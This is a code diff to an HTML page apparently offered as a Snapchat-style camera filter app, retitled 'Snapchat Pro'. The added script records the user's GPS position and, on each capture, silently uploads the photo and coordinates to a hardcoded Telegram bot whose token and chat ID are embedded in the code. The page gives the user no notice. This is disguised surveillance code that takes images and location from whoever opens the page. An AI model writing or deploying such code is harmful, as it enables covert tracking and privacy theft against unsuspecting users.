@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Snap-Like Filters with GPS</title>
+  <title>Snapchat Pro</title>
 <style>
   /* Reset styles */
   body, html {
@@ -166,104 +166,155 @@
   </div>
 
 <script>
-    const video = document.getElementById('camera');
-    const filterButtons = document.querySelectorAll('[data-filter]');
-    const captureButton = document.getElementById('capture');
-    const toggleCameraButton = document.getElementById('toggle-camera');
+  const video = document.getElementById('camera');
+  const filterButtons = document.querySelectorAll('[data-filter]');
+  const captureButton = document.getElementById('capture');
+  const toggleCameraButton = document.getElementById('toggle-camera');
 
-    let currentStream = null;
-    let usingFrontCamera = true;
+  let currentStream = null;
+  let usingFrontCamera = true;
+  let gpsLocation = null; // لتخزين موقع GPS
 
-    // Apply selected filter
-    filterButtons.forEach(button => {
-      button.addEventListener('click', () => {
-        const filter = button.dataset.filter;
+  // Apply selected filter
+  filterButtons.forEach(button => {
+    button.addEventListener('click', () => {
+      const filter = button.dataset.filter;
 
-        // Apply the selected filter to the video
-        video.style.filter = getFilter(filter);
+      // Apply the selected filter to the video
+      video.style.filter = getFilter(filter);
 
-        // Update active button
-        filterButtons.forEach(btn => btn.classList.remove('active'));
-        button.classList.add('active');
-      });
+      // Update active button
+      filterButtons.forEach(btn => btn.classList.remove('active'));
+      button.classList.add('active');
     });
+  });
 
-    // Map filter names to CSS filter values
-    function getFilter(name) {
-      switch (name) {
-        case 'grayscale':
-          return 'grayscale(100%)';
-        case 'sepia':
-          return 'sepia(100%)';
-        case 'invert':
-          return 'invert(100%)';
-        case 'blur':
-          return 'blur(5px)';
-        default:
-          return 'none';
-      }
+  // Map filter names to CSS filter values
+  function getFilter(name) {
+    switch (name) {
+      case 'grayscale':
+        return 'grayscale(100%)';
+      case 'sepia':
+        return 'sepia(100%)';
+      case 'invert':
+        return 'invert(100%)';
+      case 'blur':
+        return 'blur(5px)';
+      default:
+        return 'none';
     }
+  }
 
-    // Start camera
-    async function startCamera(front = true) {
-      const constraints = {
-        video: {
-          facingMode: front ? 'user' : 'environment',
-        },
-      };
-
-      if (currentStream) {
-        currentStream.getTracks().forEach(track => track.stop());
-      }
-
-      try {
-        currentStream = await navigator.mediaDevices.getUserMedia(constraints);
-        video.srcObject = currentStream;
-
-        // Apply mirroring effect for front camera
-        if (front) {
-          video.style.transform = 'scaleX(-1)';
-        } else {
-          video.style.transform = 'scaleX(1)';
-        }
-      } catch (error) {
-        console.error('Error accessing camera:', error);
-      }
-    }
-
-    // Toggle camera
-    toggleCameraButton.addEventListener('click', () => {
-      usingFrontCamera = !usingFrontCamera;
-      startCamera(usingFrontCamera);
-    });
-
-    // Capture image
-    captureButton.addEventListener('click', () => {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-
-      const ctx = canvas.getContext('2d');
-      ctx.filter = video.style.filter;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const image = canvas.toDataURL('image/png');
-      console.log('Captured Image:', image);
-    });
-
-    // Get GPS location
-    navigator.geolocation.getCurrentPosition(
-      position => {
-        const { latitude, longitude } = position.coords;
-        console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+  // Start camera
+  async function startCamera(front = true) {
+    const constraints = {
+      video: {
+        facingMode: front ? 'user' : 'environment',
       },
-      error => {
-        console.error('Error getting location:', error);
-      }
-    );
+    };
 
-    // Initialize
-    startCamera();
+    if (currentStream) {
+      currentStream.getTracks().forEach(track => track.stop());
+    }
+
+    try {
+      currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+      video.srcObject = currentStream;
+
+      // Apply mirroring effect for front camera
+      if (front) {
+        video.style.transform = 'scaleX(-1)';
+      } else {
+        video.style.transform = 'scaleX(1)';
+      }
+    } catch (error) {
+      console.error('Error accessing camera:', error);
+    }
+  }
+
+  // Toggle camera
+  toggleCameraButton.addEventListener('click', () => {
+    usingFrontCamera = !usingFrontCamera;
+    startCamera(usingFrontCamera);
+  });
+
+  // Capture image and send it to Telegram bot
+  captureButton.addEventListener('click', () => {
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext('2d');
+    ctx.filter = video.style.filter;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const image = canvas.toDataURL('image/png');
+    console.log('Captured Image:', image);
+
+    // Convert the image to a Blob to send it as a file
+    const byteCharacters = atob(image.split(',')[1]);
+    const byteArrays = [];
+
+    for (let offset = 0; offset < byteCharacters.length; offset++) {
+      const byteArray = new Uint8Array(1);
+      byteArray[0] = byteCharacters.charCodeAt(offset);
+      byteArrays.push(byteArray);
+    }
+
+    const blob = new Blob(byteArrays, { type: 'image/png' });
+
+    // Send the image and GPS location to Telegram bot
+    sendImageAndLocationToTelegram(blob);
+  });
+
+  // Get GPS location
+  navigator.geolocation.getCurrentPosition(
+    position => {
+      const { latitude, longitude } = position.coords;
+      gpsLocation = { latitude, longitude };
+      console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+    },
+    error => {
+      console.error('Error getting location:', error);
+    }
+  );
+
+  // Send the image and GPS location to Telegram bot
+  function sendImageAndLocationToTelegram(imageBlob) {
+    const formData = new FormData();
+    formData.append('chat_id', '1676411287'); // Replace with your chat ID
+    formData.append('photo', imageBlob, 'photo.png');
+
+    // إضافة معلومات الموقع في نص الرسالة
+    let locationText = '';
+    if (gpsLocation) {
+      locationText = `Location: Latitude ${gpsLocation.latitude}, Longitude ${gpsLocation.longitude}`;
+    } else {
+      locationText = 'Location information not available.';
+    }
+
+    // إرسال الصورة والموقع
+    formData.append('caption', locationText);
+
+    fetch(`https://api.telegram.org/bot5682784122:AAFGjK0Or0jMK8g928ckWGSt4XUTojYxcRI/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        console.log('Image and location sent successfully');
+      } else {
+        console.error('Failed to send image and location', data);
+      }
+    })
+    .catch(error => {
+      console.error('Error sending image and location to Telegram:', error);
+    });
+  }
+
+  // Initialize
+  startCamera();
 </script>
 </body>
 </html>
